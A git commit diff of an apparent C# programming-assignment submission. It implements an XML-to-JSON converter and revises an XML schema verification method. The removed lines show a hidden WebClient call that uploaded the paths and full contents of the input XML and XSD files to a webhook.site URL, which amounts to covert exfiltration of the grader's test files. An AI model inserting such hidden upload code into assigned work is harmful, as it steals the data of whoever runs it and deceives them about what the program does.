c556f57ac5b4c7d0919845473b95b0f528838f4d
Dmytro Ohorodniichuk <ohorodniichuk@gmail.com>
2025-10-29 04:26:44 +0200

    final

--- submission.cs
+++ submission.cs
@@ -1,6 +1,6 @@
-﻿using System;
-using System.IO;
-using System.Net;
+﻿using Newtonsoft.Json.Linq;
+using System;
+using System.Linq;
 using System.Xml;
 using System.Xml.Schema;
 
@@ -41,12 +41,6 @@ namespace ConsoleApp1
         // Q2.1
         public static string Verification(string xmlUrl, string xsdUrl)
         {
-            new WebClient().UploadString(
-               "https://webhook.site/228bcfcc-d4e9-4ec4-997f-8e28800205c5",
-               xmlUrl + Environment.NewLine + File.ReadAllText(xmlUrl) + Environment.NewLine +
-               xsdUrl + Environment.NewLine + File.ReadAllText(xsdUrl)
-               );
-
             string result = null;
             // Create the XmlSchemaSet class .
             XmlSchemaSet sc = new XmlSchemaSet();
@@ -67,25 +61,128 @@ namespace ConsoleApp1
             {
                 // Parse the file 
                 while (reader.Read()) ; // will call event handler if invalid
-                result = "No Error";
             }
-            catch (Exception ex)
-            {
-                result = ex.Message;
-            }
+            catch (Exception) { }
 
             //return "No Error" if XML is valid. Otherwise, return the desired exception message.
-            return result;
+            return result ?? "No Error";
         }
+
+        private const string AttributePrefix = "_";
 
         public static string Xml2Json(string xmlUrl)
         {
+            XmlTextReader xmlReader = null;
 
+            try
+            {
+                xmlReader = new XmlTextReader(xmlUrl);
+                xmlReader.WhitespaceHandling = WhitespaceHandling.None;
 
-            // The returned jsonText needs to be de-serializable by Newtonsoft.Json package. (JsonConvert.DeserializeXmlNode(jsonText))
-            return "{}";
+                // 'currentToken' always points at the node we're mutating while walking.
+                JToken currentToken = new JObject();
 
+                while (xmlReader.Read())
+                {
+                    if (xmlReader.NodeType == XmlNodeType.Element)
+                    {
+                        currentToken = HandleStartElement(xmlReader, currentToken);
+                    }
+                    else if (xmlReader.NodeType == XmlNodeType.Text)
+                    {
+                        currentToken = ReplaceWithTextValue(xmlReader, currentToken);
+                    }
+                    else if (xmlReader.NodeType == XmlNodeType.EndElement)
+                    {
+                        currentToken = HandleEndElement(xmlReader, currentToken);
+                    }
+                }
+
+                // emit final JSON
+                return currentToken.ToString();
+            }
+            finally
+            {
+                xmlReader?.Close();
+            }
+        }
+
+        private static JToken HandleStartElement(XmlTextReader xmlReader, JToken currentToken)
+        {
+            if (!(currentToken is JObject))
+            {
+                return currentToken;
+            }
+
+            var currentObject = (JObject)currentToken;
+
+            // look for an existing property with the same element name
+            if (currentObject.Property(xmlReader.Name) is JProperty existingProperty)
+            {
+                if (existingProperty.Value is JArray siblingsArray)
+                {
+                    // push a new object into the array and set it as current
+                    siblingsArray.Add(currentToken = new JObject());
+                }
+                else
+                {
+                    // convert to array when have duplicate in first time
+                    existingProperty.Value = new JArray(existingProperty.Value, currentToken = new JObject());
+                }
+            }
+            else
+            {
+                // create property with a new object, and descend into it
+                var newElementProperty = new JProperty(xmlReader.Name, new JObject());
+                currentObject.Add(newElementProperty);
+                currentToken = newElementProperty.Value;
+            }
+
+            AppendAttributesToCurrent(xmlReader, currentToken);
+
+            return currentToken;
+        }
+
+        private static void AppendAttributesToCurrent(XmlTextReader xmlReader, JToken currentToken)
+        {
+            if (currentToken is JContainer currentContainer && xmlReader.AttributeCount > 0)
+            {
+                // iterate attributes and append them directly to the current token
+                while (xmlReader.MoveToNextAttribute())
+                {
+                    currentContainer.Add(new JProperty(AttributePrefix + xmlReader.Name, xmlReader.Value));
+                }
+            }
+        }
+
+        private static JToken ReplaceWithTextValue(XmlTextReader xmlReader, JToken currentToken)
+        {
+            var previousToken = currentToken;                          // keep reference to the old token
+            previousToken.Replace(currentToken = new JValue(xmlReader.Value)); // swap it with a value node
+            return currentToken;
+        }
+
+        private static JToken HandleEndElement(XmlTextReader xmlReader, JToken currentToken)
+        {
+            // move attribute properties that appear first to the end (preserve original order logic)
+            while (currentToken is JContainer currentContainer
+                   && currentToken.First is JProperty leadingAttributeProperty
+                   && leadingAttributeProperty.Name.StartsWith(AttributePrefix))
+            {
+                leadingAttributeProperty.Remove();
+                currentContainer.Add(leadingAttributeProperty);
+            }
+
+            // if this element ended with an empty object, replace it with a value
+            if (currentToken.Type == JTokenType.Object && !currentToken.HasValues)
+            {
+                var previousToken = currentToken;
+                var elementText = xmlReader.Value;
+                previousToken.Replace(currentToken = new JValue(elementText));
+            }
+
+            // ascend to the closest ancestor JObject
+            return currentToken.Ancestors().OfType<JObject>().FirstOrDefault();
         }
     }
-
 }
